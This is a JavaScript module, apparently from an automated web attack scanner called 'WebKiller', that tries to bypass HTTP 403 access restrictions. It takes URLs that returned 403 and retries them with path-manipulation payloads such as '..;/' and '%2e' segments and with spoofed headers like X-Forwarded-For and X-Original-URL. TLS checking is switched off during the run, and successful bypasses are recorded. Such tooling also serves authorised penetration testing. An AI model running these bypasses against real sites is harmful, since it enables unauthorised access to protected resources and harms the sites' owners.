const { BaseModule, ModuleResult } = require('./base');
const { batchAsync } = require('../runner');

const BYPASS_PAYLOADS = [
  (p) => p + '/.',
  (p) => p + '/./',
  (p) => p + '..;/',
  (p) => '/' + p.replace(/^\/+/, '').replace(/\//g, '/%2e/'),
  (p) => p + '%20',
  (p) => p + '%09',
  (p) => p + '?',
  (p) => p + '#',
  (p) => p + ';',
  (p) => p.replace(/\/+$/, '') + '..;/',
];

const BYPASS_HEADERS = [
  { 'X-Forwarded-For': '127.0.0.1' },
  { 'X-Original-URL': '__PATH__' },
  { 'X-Rewrite-URL': '__PATH__' },
  { 'X-Custom-IP-Authorization': '127.0.0.1' },
  { 'X-Forwarded-Host': 'localhost' },
  { 'X-Host': 'localhost' },
];

class Bypass403 extends BaseModule {
  static moduleName = 'bypass_403';
  static phase = 'P6b';
  static toolsNeeded = [];

  async execute() {
    const findingsData = this.workspace.readJsonl('findings.jsonl');
    const urls403FromFindings = findingsData
      .filter(f => f.status_code === 403)
      .map(f => f.url);

    const hostsData = this.workspace.readJsonl('hosts.jsonl');
    const urls403FromHosts = hostsData
      .filter(h => h.status_code === 403)
      .map(h => h.url);

    const urls403Set = new Set([...urls403FromFindings, ...urls403FromHosts]);
    const urls403 = [...urls403Set].slice(0, 30);

    if (urls403.length === 0) {
      return new ModuleResult({ module: Bypass403.moduleName, status: 'skipped', errors: ['No 403 URLs found'] });
    }

    const confirmed = [];
    const items = [];
    const ua = this.config.user_agent || 'WebKiller/3.0';

    const { pushInsecureTLS, popInsecureTLS } = require('../tls_guard');
    pushInsecureTLS();

    try {
      this.emit('log', { msg: `Testing ${urls403.length} URLs for 403 bypass (5 concurrent)` });
      const bypassResults = await batchAsync(urls403, 5, async (url) => {
        let parsed;
        try { parsed = new URL(url); } catch { return null; }
        const urlPath = parsed.pathname;

        for (const payloadFn of BYPASS_PAYLOADS) {
          const tryPath = payloadFn(urlPath);
          const tryUrl = `${parsed.protocol}//${parsed.host}${tryPath}`;
          try {
            const resp = await fetch(tryUrl, {
              method: 'GET',
              headers: { 'User-Agent': ua },
              signal: AbortSignal.timeout(10000),
              redirect: 'manual',
            });
            if (resp.status === 200) {
              return {
                confirmed: { url: tryUrl, original_url: url, vuln_class: '403_bypass', severity: 'medium', method: 'path_traversal', evidence: { bypass_path: tryPath, status: 200 } },
                item: `[403-BYPASS] ${url} → ${tryPath}`,
              };
            }
          } catch { continue; }
        }

        for (const hdrSet of BYPASS_HEADERS) {
          const headers = { 'User-Agent': ua };
          for (const [k, v] of Object.entries(hdrSet)) {
            headers[k] = v.replace('__PATH__', urlPath);
          }
          try {
            const resp = await fetch(url, {
              method: 'GET',
              headers,
              signal: AbortSignal.timeout(10000),
              redirect: 'manual',
            });
            if (resp.status === 200) {
              return {
                confirmed: { url, vuln_class: '403_bypass', severity: 'medium', method: 'header_injection', evidence: { header: Object.keys(hdrSet)[0], status: 200 } },
                item: `[403-BYPASS] ${url} via ${Object.keys(hdrSet)[0]}`,
              };
            }
          } catch { continue; }
        }
        return null;
      });

      for (const r of bypassResults) {
        if (r) {
          confirmed.push(r.confirmed);
          items.push(r.item);
        }
      }
    } finally {
      popInsecureTLS();
    }

    this.workspace.appendJsonl('confirmed.jsonl', confirmed);
    return new ModuleResult({ module: Bypass403.moduleName, items, records: confirmed, toolUsed: 'python-bypass' });
  }
}

module.exports = Bypass403;
